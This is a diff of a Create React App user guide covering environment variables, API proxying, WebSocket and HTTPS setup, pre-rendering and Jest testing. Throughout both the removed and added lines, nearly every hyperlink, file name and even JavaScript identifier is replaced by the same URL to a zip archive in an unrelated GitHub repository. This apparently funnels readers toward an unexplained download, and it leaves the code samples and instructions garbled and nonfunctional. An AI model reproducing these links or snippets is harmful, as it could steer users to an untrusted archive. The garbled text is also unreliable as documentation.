+* `npm start`: `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`, `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`, `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`, `.env`
+* `npm run build`: `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`, `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`, `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`, `.env`
+* `npm test`: `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`, `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`, `.env` (note `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` is missing)
 
 These variables will act as the defaults if the machine does not explicitly set them.<br>
-Please refer to the [dotenv documentation](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) for more details.
+Please refer to the [dotenv documentation](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) for more details.
 
 >Note: If you are defining environment variables for development, your CI and/or hosting platform will most likely need
-these defined as well. Consult their documentation how to do this. For example, see the documentation for [Travis CI](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) or [Heroku](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+these defined as well. Consult their documentation how to do this. For example, see the documentation for [Travis CI](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) or [Heroku](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
 #### Expanding Environment Variables In `.env`
 
 >Note: this feature is available with `react-scripts@1.1.0` and higher.
 
-Expand variables already on your machine for use in your `.env` file (using [dotenv-expand](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)).
+Expand variables already on your machine for use in your `.env` file (using [dotenv-expand](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)).
 
 For example, to get the environment variable `npm_package_version`:
 
@@ -995,14 +995,14 @@ REACT_APP_VERSION=$npm_package_version
 Or expand variables local to the current `.env` file:
 
 ```
-https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip
+https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip
 REACT_APP_FOO=$DOMAIN/foo
 REACT_APP_BAR=$DOMAIN/bar
 ```
 
 ## Can I Use Decorators?
 
-Many popular libraries use [decorators](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) in their documentation.<br>
+Many popular libraries use [decorators](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) in their documentation.<br>
 Create React App doesn’t support decorator syntax at the moment because:
 
 * It is an experimental proposal and is subject to change.
@@ -1012,20 +1012,20 @@ Create React App doesn’t support decorator syntax at the moment because:
 However in many cases you can rewrite decorator-based code without decorators just as fine.<br>
 Please refer to these two threads for reference:
 
-* [#214](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
-* [#411](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+* [#214](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
+* [#411](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 
 Create React App will add decorator support when the specification advances to a stable stage.
 
 ## Fetching Data with AJAX Requests
 
-React doesn't prescribe a specific approach to data fetching, but people commonly use either a library like [axios](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) or the [`fetch()` API](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) provided by the browser. Conveniently, Create React App includes a polyfill for `fetch()` so you can use it without worrying about the browser support.
+React doesn't prescribe a specific approach to data fetching, but people commonly use either a library like [axios](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) or the [`fetch()` API](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) provided by the browser. Conveniently, Create React App includes a polyfill for `fetch()` so you can use it without worrying about the browser support.
 
-The global `fetch` function allows to easily makes AJAX requests. It takes in a URL as an input and returns a `Promise` that resolves to a `Response` object. You can find more information about `fetch` [here](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+The global `fetch` function allows to easily makes AJAX requests. It takes in a URL as an input and returns a `Promise` that resolves to a `Response` object. You can find more information about `fetch` [here](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
-This project also includes a [Promise polyfill](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) which provides a full implementation of Promises/A+. A Promise represents the eventual result of an asynchronous operation, you can find more information about Promises [here](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) and [here](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip). Both axios and `fetch()` use Promises under the hood. You can also use the [`async / await`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) syntax to reduce the callback nesting.
+This project also includes a [Promise polyfill](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) which provides a full implementation of Promises/A+. A Promise represents the eventual result of an asynchronous operation, you can find more information about Promises [here](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) and [here](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip). Both axios and `fetch()` use Promises under the hood. You can also use the [`async / await`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) syntax to reduce the callback nesting.
 
-You can learn more about making AJAX requests from React components in [the FAQ entry on the React website](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+You can learn more about making AJAX requests from React components in [the FAQ entry on the React website](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
 ## Integrating with an API Backend
 
@@ -1033,13 +1033,13 @@ These tutorials will help you to integrate your app with an API backend running 
 using `fetch()` to access it.
 
 ### Node
-Check out [this tutorial](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
-You can find the companion GitHub repository [here](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+Check out [this tutorial](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
+You can find the companion GitHub repository [here](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
 ### Ruby on Rails
 
-Check out [this tutorial](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
-You can find the companion GitHub repository [here](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+Check out [this tutorial](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
+You can find the companion GitHub repository [here](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
 ## Proxying API Requests in Development
 
@@ -1049,14 +1049,14 @@ People often serve the front-end React app from the same host and port as their 
 For example, a production setup might look like this after the app is deployed:
 
 ```
-/             - static server returns https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip with React app
-/todos        - static server returns https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip with React app
+/             - static server returns https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip with React app
+/todos        - static server returns https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip with React app
 /api/todos    - server handles any /api/* requests using the backend implementation
 ```
 
 Such setup is **not** required. However, if you **do** have a setup like this, it is convenient to write requests like `fetch('/api/todos')` without worrying about redirecting them to another host or port during development.
 
-To tell the development server to proxy any unknown requests to your API server in development, add a `proxy` field to your `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`, for example:
+To tell the development server to proxy any unknown requests to your API server in development, add a `proxy` field to your `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`, for example:
 
 ```js
   "proxy": "http://localhost:4000",
@@ -1064,7 +1064,7 @@ To tell the development server to proxy any unknown requests to your API server 
 
 This way, when you `fetch('/api/todos')` in development, the development server will recognize that it’s not a static asset, and will proxy your request to `http://localhost:4000/api/todos` as a fallback. The development server will **only** attempt to send requests without `text/html` in its `Accept` header to the proxy.
 
-Conveniently, this avoids [CORS issues](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) and error messages like this in development:
+Conveniently, this avoids [CORS issues](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) and error messages like this in development:
 
 ```
 Fetch API cannot load http://localhost:4000/api/todos. No 'Access-Control-Allow-Origin' header is present on the requested resource. Origin 'http://localhost:3000' is therefore not allowed access. If an opaque response serves your needs, set the request's mode to 'no-cors' to fetch the resource with CORS disabled.
@@ -1076,26 +1076,26 @@ The `proxy` option supports HTTP, HTTPS and WebSocket connections.<br>
 If the `proxy` option is **not** flexible enough for you, alternatively you can:
 
 * [Configure the proxy yourself](#configuring-the-proxy-manually)
-* Enable CORS on your server ([here’s how to do it for Express](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)).
+* Enable CORS on your server ([here’s how to do it for Express](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)).
 * Use [environment variables](#adding-custom-environment-variables) to inject the right server host and port into your app.
 
 ### "Invalid Host Header" Errors After Configuring Proxy
 
-When you enable the `proxy` option, you opt into a more strict set of host checks. This is necessary because leaving the backend open to remote hosts makes your computer vulnerable to DNS rebinding attacks. The issue is explained in [this article](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) and [this issue](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+When you enable the `proxy` option, you opt into a more strict set of host checks. This is necessary because leaving the backend open to remote hosts makes your computer vulnerable to DNS rebinding attacks. The issue is explained in [this article](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) and [this issue](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
-This shouldn’t affect you when developing on `localhost`, but if you develop remotely like [described here](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip), you will see this error in the browser after enabling the `proxy` option:
+This shouldn’t affect you when developing on `localhost`, but if you develop remotely like [described here](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip), you will see this error in the browser after enabling the `proxy` option:
 
 >Invalid Host header
 
-To work around it, you can specify your public development host in a file called `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` in the root of your project:
+To work around it, you can specify your public development host in a file called `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` in the root of your project:
 
 ```
-https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip
+https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip
 ```
 
 If you restart the development server now and load the app from the specified host, it should work.
 
-If you are still having issues or if you’re using a more exotic environment like a cloud editor, you can bypass the host check completely by adding a line to `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`. **Note that this is dangerous and exposes your machine to remote code execution from malicious websites:**
+If you are still having issues or if you’re using a more exotic environment like a cloud editor, you can bypass the host check completely by adding a line to `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`. **Note that this is dangerous and exposes your machine to remote code execution from malicious websites:**
 
 ```
 # NOTE: THIS IS DANGEROUS!
@@ -1109,8 +1109,8 @@ We don’t recommend this approach.
 
 >Note: this feature is available with `react-scripts@1.0.0` and higher.
 
-If the `proxy` option is **not** flexible enough for you, you can specify an object in the following form (in `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`).<br>
-You may also specify any configuration value [`http-proxy-middleware`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) or [`http-proxy`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) supports.
+If the `proxy` option is **not** flexible enough for you, you can specify an object in the following form (in `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`).<br>
+You may also specify any configuration value [`http-proxy-middleware`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) or [`http-proxy`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) supports.
 ```js
 {
   // ...
@@ -1148,12 +1148,12 @@ Matches are regular expressions, so that you can use a regexp to match multiple 
       }
       // ...
     },
-    // Matches https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip but not https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip
+    // Matches https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip but not https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip
     "/bar/[^/]*[.]html": {
       "target": "<url_3>",
       // ...
     },
-    // Matches https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip and https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip
+    // Matches https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip and https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip
     "/baz/.*/.*[.]html": {
       "target": "<url_4>"
       // ...
@@ -1167,13 +1167,13 @@ Matches are regular expressions, so that you can use a regexp to match multiple 
 
 When setting up a WebSocket proxy, there are a some extra considerations to be aware of.
 
-If you’re using a WebSocket engine like [https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip), you must have a https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip server running that you can use as the proxy target. https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip will not work with a standard WebSocket server. Specifically, don't expect https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip to work with [the https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip echo test](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+If you’re using a WebSocket engine like [https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip), you must have a https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip server running that you can use as the proxy target. https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip will not work with a standard WebSocket server. Specifically, don't expect https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip to work with [the https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip echo test](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
-There’s some good documentation available for [setting up a https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip server](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+There’s some good documentation available for [setting up a https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip server](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
-Standard WebSockets **will** work with a standard WebSocket server as well as the https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip echo test. You can use libraries like [ws](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) for the server, with [native WebSockets in the browser](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+Standard WebSockets **will** work with a standard WebSocket server as well as the https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip echo test. You can use libraries like [ws](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) for the server, with [native WebSockets in the browser](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
-Either way, you can proxy WebSocket requests manually in `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`:
+Either way, you can proxy WebSocket requests manually in `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`:
 
 ```js
 {
@@ -1184,7 +1184,7 @@ Either way, you can proxy WebSocket requests manually in `https://raw.githubuser
       "target": "ws://<socket_url>",
       // Tell http-proxy-middleware that this is a WebSocket proxy.
       // Also allows you to proxy WebSocket requests without an additional HTTP request
-      // https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip
+      // https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip
       "ws": true
       // ...
     }
@@ -1201,7 +1201,7 @@ You may require the dev server to serve pages over HTTPS. One particular case wh
 
 To do this, set the `HTTPS` environment variable to `true`, then start the dev server as usual with `npm start`:
 
-#### Windows (https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+#### Windows (https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 
 ```cmd
 set HTTPS=true&&npm start
@@ -1235,19 +1235,19 @@ Since Create React App doesn’t support server rendering, you might be wonderin
     <meta property="og:description" content="__OG_DESCRIPTION__">
 ```
 
-Then, on the server, regardless of the backend you use, you can read `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` into memory and replace `__OG_TITLE__`, `__OG_DESCRIPTION__`, and any other placeholders with values depending on the current URL. Just make sure to sanitize and escape the interpolated values so that they are safe to embed into HTML!
+Then, on the server, regardless of the backend you use, you can read `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` into memory and replace `__OG_TITLE__`, `__OG_DESCRIPTION__`, and any other placeholders with values depending on the current URL. Just make sure to sanitize and escape the interpolated values so that they are safe to embed into HTML!
 
 If you use a Node server, you can even share the route matching logic between the client and the server. However duplicating it also works fine in simple cases.
 
 ## Pre-Rendering into Static HTML Files
 
-If you’re hosting your `build` with a static hosting provider you can use [react-snapshot](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) or [react-snap](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) to generate HTML pages for each route, or relative link, in your application. These pages will then seamlessly become active, or “hydrated”, when the JavaScript bundle has loaded.
+If you’re hosting your `build` with a static hosting provider you can use [react-snapshot](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) or [react-snap](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) to generate HTML pages for each route, or relative link, in your application. These pages will then seamlessly become active, or “hydrated”, when the JavaScript bundle has loaded.
 
 There are also opportunities to use this outside of static hosting, to take the pressure off the server when generating and caching routes.
 
 The primary benefit of pre-rendering is that you get the core content of each page _with_ the HTML payload—regardless of whether or not your JavaScript bundle successfully downloads. It also increases the likelihood that each route of your application will be picked up by search engines.
 
-You can read more about [zero-configuration pre-rendering (also called snapshotting) here](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+You can read more about [zero-configuration pre-rendering (also called snapshotting) here](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
 ## Injecting Data from the Server into the Page
 
@@ -1258,22 +1258,22 @@ Similarly to the previous section, you can leave some placeholders in the HTML t
 <html lang="en">
   <head>
     <script>
-      https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip = __SERVER_DATA__;
+      https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip = __SERVER_DATA__;
     </script>
 ```
 
-Then, on the server, you can replace `__SERVER_DATA__` with a JSON of real data right before sending the response. The client code can then read `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` to use it. **Make sure to [sanitize the JSON before sending it to the client](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) as it makes your app vulnerable to XSS attacks.**
+Then, on the server, you can replace `__SERVER_DATA__` with a JSON of real data right before sending the response. The client code can then read `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` to use it. **Make sure to [sanitize the JSON before sending it to the client](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) as it makes your app vulnerable to XSS attacks.**
 
 ## Running Tests
 
 >Note: this feature is available with `react-scripts@0.3.0` and higher.<br>
->[Read the migration guide to learn how to enable it in older projects!](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+>[Read the migration guide to learn how to enable it in older projects!](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 
-Create React App uses [Jest](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) as its test runner. To prepare for this integration, we did a [major revamp](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) of Jest so if you heard bad things about it years ago, give it another try.
+Create React App uses [Jest](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) as its test runner. To prepare for this integration, we did a [major revamp](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) of Jest so if you heard bad things about it years ago, give it another try.
 
 Jest is a Node-based runner. This means that the tests always run in a Node environment and not in a real browser. This lets us enable fast iteration speed and prevent flakiness.
 
-While Jest provides browser globals such as `window` thanks to [jsdom](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip), they are only approximations of the real browser behavior. Jest is intended to be used for unit tests of your logic and your components rather than the DOM quirks.
+While Jest provides browser globals such as `window` thanks to [jsdom](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip), they are only approximations of the real browser behavior. Jest is intended to be used for unit tests of your logic and your components rather than the DOM quirks.
 
 We recommend that you use a separate tool for browser end-to-end tests if you need them. They are beyond the scope of Create React App.
 
@@ -1282,12 +1282,12 @@ We recommend that you use a separate tool for browser end-to-end tests if you ne
 Jest will look for test files with any of the following popular naming conventions:
 
 * Files with `.js` suffix in `__tests__` folders.
-* Files with `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` suffix.
-* Files with `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` suffix.
+* Files with `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` suffix.
+* Files with `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` suffix.
 
-The `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` / `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` files (or the `__tests__` folders) can be located at any depth under the `src` top level folder.
+The `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` / `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` files (or the `__tests__` folders) can be located at any depth under the `src` top level folder.
 
-We recommend to put the test files (or `__tests__` folders) next to the code they are testing so that relative imports appear shorter. For example, if `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` and `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` are in the same folder, the test just needs to `import App from './App'` instead of a long relative path. Colocation also helps find tests more quickly in larger projects.
+We recommend to put the test files (or `__tests__` folders) next to the code they are testing so that relative imports appear shorter. For example, if `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` and `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` are in the same folder, the test just needs to `import App from './App'` instead of a long relative path. Colocation also helps find tests more quickly in larger projects.
 
 ### Command Line Interface
 
@@ -1295,7 +1295,7 @@ When you run `npm test`, Jest will launch in the watch mode. Every time you save
 
 The watcher includes an interactive command-line interface with the ability to run all tests, or focus on a search pattern. It is designed this way so that you can keep it open and enjoy fast re-runs. You can learn the commands from the “Watch Usage” note that the watcher prints after every run:
 
-![Jest watch mode](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+![Jest watch mode](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 
 ### Version Control Integration
 
@@ -1320,8 +1320,8 @@ it('sums numbers', () => {
 });
 ```
 
-All `expect()` matchers supported by Jest are [extensively documented here](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).<br>
-You can also use [`https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip()` and `expect(fn).toBeCalled()`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) to create “spies” or mock functions.
+All `expect()` matchers supported by Jest are [extensively documented here](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).<br>
+You can also use [`https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip()` and `expect(fn).toBeCalled()`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) to create “spies” or mock functions.
 
 ### Testing Components
 
@@ -1335,16 +1335,16 @@ import ReactDOM from 'react-dom';
 import App from './App';
 
 it('renders without crashing', () => {
-  const div = https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip('div');
-  https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip(<App />, div);
+  const div = https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip('div');
+  https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip(<App />, div);
 });
 ```
 
-This test mounts a component and makes sure that it didn’t throw during rendering. Tests like this provide a lot of value with very little effort so they are great as a starting point, and this is the test you will find in `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`.
+This test mounts a component and makes sure that it didn’t throw during rendering. Tests like this provide a lot of value with very little effort so they are great as a starting point, and this is the test you will find in `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`.
 
